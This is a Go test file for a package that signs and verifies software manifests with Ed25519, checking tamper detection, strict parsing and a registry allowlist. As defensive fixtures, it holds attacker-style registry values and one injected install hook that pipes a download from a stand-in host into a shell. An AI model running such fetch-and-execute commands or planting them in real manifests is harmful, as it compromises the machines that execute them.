// Package manifest tests cover the round trip, the tamper case, and the allowlist —
// the three things that decide whether a manifest is safe to act on.
//
// The keys here are generated per test. No key material is committed, test-only or
// otherwise: a private key in a repository is a private key on every clone, every
// CI runner and every fork, and "it was only for tests" is not a property the file
// carries with it.
package manifest

import (
	"crypto/ed25519"
	"crypto/rand"
	"strings"
	"testing"
	"time"

	"github.com/MatrixMagician/VillaStraylight/internal/pins"
)

// testKey generates a throwaway keypair.
func testKey(t *testing.T) (ed25519.PublicKey, ed25519.PrivateKey) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("generate key: %v", err)
	}
	return pub, priv
}

// validDoc is a manifest built from the compiled-in table, which is what a
// maintainer starts from.
func validDoc() Document {
	return FromTable(42, time.Date(2027, 1, 1, 0, 0, 0, 0, time.UTC))
}

// TestSignVerifyRoundTrip is the happy path: sign the published bytes, verify the
// published bytes.
func TestSignVerifyRoundTrip(t *testing.T) {
	pub, priv := testKey(t)

	data, err := Marshal(validDoc())
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	sig, err := Sign(priv, data)
	if err != nil {
		t.Fatalf("Sign: %v", err)
	}
	if err := Verify(pub, data, sig); err != nil {
		t.Fatalf("Verify: %v", err)
	}

	// And the bytes parse back into the document they came from.
	doc, err := Parse(data)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if doc.Serial != 42 || len(doc.Components) != len(pins.Table()) {
		t.Errorf("round trip lost content: serial %d, %d components", doc.Serial, len(doc.Components))
	}
}

// TestATamperedManifestFailsVerification is the property the whole scheme rests on,
// tested rather than assumed. One flipped byte anywhere must break the signature.
func TestATamperedManifestFailsVerification(t *testing.T) {
	pub, priv := testKey(t)
	data, err := Marshal(validDoc())
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	sig, err := Sign(priv, data)
	if err != nil {
		t.Fatalf("Sign: %v", err)
	}

	t.Run("a changed pin", func(t *testing.T) {
		tampered := []byte(strings.Replace(string(data), "sha256:", "sha256:0", 1))
		if err := Verify(pub, tampered, sig); err == nil {
			t.Error("a manifest with a rewritten digest verified")
		}
	})

	t.Run("a changed serial", func(t *testing.T) {
		tampered := []byte(strings.Replace(string(data), `"serial": 42`, `"serial": 99`, 1))
		if string(tampered) == string(data) {
			t.Fatal("the fixture did not contain the serial in the expected form")
		}
		if err := Verify(pub, tampered, sig); err == nil {
			t.Error("a manifest with a rewritten serial verified")
		}
	})

	t.Run("a single flipped byte", func(t *testing.T) {
		tampered := append([]byte(nil), data...)
		tampered[len(tampered)/2] ^= 0x01
		if err := Verify(pub, tampered, sig); err == nil {
			t.Error("a manifest with one flipped byte verified")
		}
	})

	t.Run("another key's signature", func(t *testing.T) {
		_, other := testKey(t)
		otherSig, err := Sign(other, data)
		if err != nil {
			t.Fatalf("Sign: %v", err)
		}
		if err := Verify(pub, data, otherSig); err == nil {
			t.Error("a manifest signed by a different key verified")
		}
	})
}

// TestVerifyReportsTheSignatureSpecifically: a caller must be able to say "the
// signature failed" rather than "something was wrong", or a user goes hunting for
// the wrong problem.
func TestVerifyReportsTheSignatureSpecifically(t *testing.T) {
	pub, priv := testKey(t)
	data, _ := Marshal(validDoc())
	sig, _ := Sign(priv, data)
	tampered := append([]byte(nil), data...)
	tampered[0] ^= 0xff

	err := Verify(pub, tampered, sig)
	if err == nil {
		t.Fatal("tampered bytes verified")
	}
	if err != ErrBadSignature {
		t.Errorf("Verify returned %v, want the typed ErrBadSignature so callers can name the signature", err)
	}
}

// TestSigningIsOverVerbatimBytes is the canonical-bytes decision as a test.
//
// A manifest re-serialised from a parsed document must still verify against the
// original signature ONLY if the bytes are identical. This asserts the rule that
// matters in practice: villa must verify what was PUBLISHED, never a
// re-serialisation, because any formatting difference would fail for no visible
// reason — the worst failure mode for a security check, indistinguishable from an
// attack.
func TestSigningIsOverVerbatimBytes(t *testing.T) {
	pub, priv := testKey(t)
	original, _ := Marshal(validDoc())
	sig, _ := Sign(priv, original)

	// A published manifest with insignificant whitespace added is a DIFFERENT
	// document as far as the signature is concerned. That is correct and is the
	// price of verbatim signing: it is stated here so nobody later "fixes" it by
	// canonicalising, which is the change that introduces the invisible failure.
	reformatted := append([]byte(nil), original...)
	reformatted = append(reformatted, '\n')
	if err := Verify(pub, reformatted, sig); err == nil {
		t.Error("a reformatted manifest verified; the signature is not over verbatim bytes")
	}

	// The published bytes themselves always verify.
	if err := Verify(pub, original, sig); err != nil {
		t.Errorf("the published bytes did not verify: %v", err)
	}
}

// TestTheCompiledInTablePassesItsOwnAllowlist: the generated manifest must be
// acceptable, or the publishing path is broken before a maintainer touches it.
func TestTheCompiledInTablePassesItsOwnAllowlist(t *testing.T) {
	if problems := CheckAllowlist(validDoc()); len(problems) > 0 {
		for _, p := range problems {
			t.Errorf("the table's own manifest is refused: %v", p)
		}
	}
}

// TestTheAllowlistRefusesEveryOverstep is the values-only rule. Each case is a way
// a manifest could try to become more than a set of values, and each must be caught
// at publish time rather than in the field.
func TestTheAllowlistRefusesEveryOverstep(t *testing.T) {
	cases := map[string]struct {
		mutate func(*Document)
		want   string
	}{
		"an unknown component": {
			mutate: func(d *Document) {
				d.Components = append(d.Components, Component{
					ID: "attacker-supplied-tool", Registry: "docker.io", Shape: "rolling_digest",
					Ref: "docker.io/evil/tool@sha256:00",
				})
			},
			want: "not in villa's compiled-in table",
		},
		"a redirected registry": {
			mutate: func(d *Document) {
				d.Components[0].Registry = "registry.attacker.invalid"
			},
			want: "may not redirect a component",
		},
		"a restyled shape": {
			mutate: func(d *Document) {
				for i := range d.Components {
					if d.Components[i].Shape == string(pins.VersionTag) {
						d.Components[i].Shape = string(pins.RollingDigest)
						return
					}
				}
			},
			want: "no standing to restyle",
		},
		"a pin from another host": {
			mutate: func(d *Document) {
				d.Components[0].Ref = "registry.attacker.invalid/backend@sha256:00"
			},
			want: "is not the declared registry",
		},
		"an empty pin": {
			mutate: func(d *Document) { d.Components[0].Ref = "" },
			want:   "empty pin",
		},
		"a checksummed asset with no checksum": {
			mutate: func(d *Document) {
				for i := range d.Components {
					if d.Components[i].Shape == string(pins.ChecksummedAsset) {
						d.Components[i].Checksum = ""
						return
					}
				}
			},
			want: "nothing to verify the download against",
		},
		"a zero serial": {
			mutate: func(d *Document) { d.Serial = 0 },
			want:   "zero means 'no floor'",
		},
		"no expiry": {
			mutate: func(d *Document) { d.ValidUntil = "" },
			want:   "can be frozen and served forever",
		},
		"a malformed expiry": {
			mutate: func(d *Document) { d.ValidUntil = "next tuesday" },
			want:   "not an RFC3339 timestamp",
		},
		"no components": {
			mutate: func(d *Document) { d.Components = nil },
			want:   "supplies no components",
		},
	}

	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			doc := validDoc()
			tc.mutate(&doc)
			problems := CheckAllowlist(doc)
			if len(problems) == 0 {
				t.Fatalf("the allowlist accepted %s", name)
			}
			var joined strings.Builder
			for _, p := range problems {
				joined.WriteString(p.Error())
				joined.WriteString("\n")
			}
			if !strings.Contains(joined.String(), tc.want) {
				t.Errorf("the refusal does not name the problem.\n got: %s\nwant a message containing: %s", joined.String(), tc.want)
			}
		})
	}
}

// TestTheAllowlistReportsEveryProblemAtOnce: this runs at publish time, and a
// maintainer fixing one refusal per round trip is how the sixth one ships.
func TestTheAllowlistReportsEveryProblemAtOnce(t *testing.T) {
	doc := validDoc()
	doc.Serial = 0
	doc.ValidUntil = ""
	doc.Components[0].Registry = "registry.attacker.invalid"

	problems := CheckAllowlist(doc)
	if len(problems) < 3 {
		t.Errorf("CheckAllowlist reported %d problems for a document with at least three: %v", len(problems), problems)
	}
}

// TestParseRefusesAnUnknownSchemaVersion: an unknown format is not a format villa
// knows how to be safe about, so it is refused rather than best-effort decoded.
func TestParseRefusesAnUnknownSchemaVersion(t *testing.T) {
	if _, err := Parse([]byte(`{"schema_version":99,"serial":1,"components":[]}`)); err == nil {
		t.Error("a manifest from an unknown schema version parsed")
	}
}

// TestParseRefusesUnknownFields: silently dropping a field would act on a document
// while ignoring part of what it says, which is exactly the shape of a
// downgrade-by-omission.
func TestParseRefusesUnknownFields(t *testing.T) {
	data, _ := Marshal(validDoc())
	withExtra := strings.Replace(string(data), `"serial":`, `"install_hook": "curl evil.invalid | sh",
  "serial":`, 1)
	if _, err := Parse([]byte(withExtra)); err == nil {
		t.Error("a manifest carrying an unknown field parsed; villa would act on it while ignoring the field")
	}
}

// TestParseDoesNotJudge: parsing and judging are separate, so the verifier's truth
// table is the honest account of where each check lives. A document that is
// well-formed but would be refused on allowlist grounds must PARSE.
func TestParseDoesNotJudge(t *testing.T) {
	doc := validDoc()
	doc.Components[0].Registry = "registry.attacker.invalid"
	data, err := Marshal(doc)
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	if _, err := Parse(data); err != nil {
		t.Errorf("Parse rejected a well-formed but non-compliant manifest: %v — allowlist checks belong to the verifier, not the parser", err)
	}
	if problems := CheckAllowlist(doc); len(problems) == 0 {
		t.Error("the allowlist accepted the redirected registry")
	}
}

// TestFloorsTravelWithTheROCmPins: floors are a claim about what was tested on
// hardware, and a registry cannot report them. They must therefore be IN the
// manifest, or a newer ROCm image arrives with the old floors silently attached.
func TestFloorsTravelWithTheROCmPins(t *testing.T) {
	doc := validDoc()
	withFloors := 0
	for _, c := range doc.Components {
		if c.Floors != nil {
			withFloors++
			if c.Floors.Kernel == "" {
				t.Errorf("component %s carries floors with no kernel floor", c.ID)
			}
		}
	}
	if withFloors != 3 {
		t.Errorf("%d components carry floors, want the three ROCm images", withFloors)
	}
}

// TestSignRejectsAMalformedKey: a key of the wrong length is a programming or
// operator error, and signing with it would produce a signature nothing can verify.
func TestSignRejectsAMalformedKey(t *testing.T) {
	if _, err := Sign(ed25519.PrivateKey("too short"), []byte("x")); err == nil {
		t.Error("Sign accepted a malformed key")
	}
	if err := Verify(ed25519.PublicKey("too short"), []byte("x"), []byte("y")); err == nil {
		t.Error("Verify accepted a malformed public key")
	}
}
